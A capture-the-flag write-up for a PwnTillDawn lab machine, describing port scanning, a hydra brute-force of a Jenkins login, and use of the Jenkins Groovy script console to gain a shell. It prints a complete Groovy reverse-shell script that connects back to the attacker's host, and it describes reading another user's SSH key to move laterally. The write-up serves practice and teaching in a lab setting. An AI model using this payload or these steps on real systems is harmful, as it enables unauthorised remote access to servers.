# 10.150.150.38 - PWNTILLDAWN WRITEUP

The following ports were found using rustscan

![](images/rustscan_results.png)

I served the ports to nmap and got found a http site

![](images/nmap_results.png)

It was a jekins login page, i tried the usual default login pairs but none worked.

![](images/jekins_failed_default.png)

After some digging I decided to use hydra to bruteforce it

![](images/hydra_command.png)

We got a hit :grin: !

![](images/hydra_success.png)

Inputed the details and we have a dashboard now.

![](images/jekins_dashboard.png)

Looked around and found a flag under the `people` tab

![](images/people.png)

Looked around a bit more and found out i could run scripts here. Found a walkthrough on how to get a shell using "Jekins Groovy Scirpt" here: `https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6`

I pasted the code into the groovy scripts input box 

```
String host="ip";
int port="port";
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```

Then started a netcat listener and ran the script

![alt text](images/shell.png)

Found another Flag

![alt text](images/flag70.png)

Ran Linpeas but no dice, looked around and found another user `juniordev`, the user has a `.ssh` folder but i cannot `-ls -la` the folder due to permission issues

![](images/junirdevlsla.png)

But funny enough I can `cat` out it's presumed contents:

![](images/cat.png)

Copy paste and ssh into junior dev and voila we are juniordev


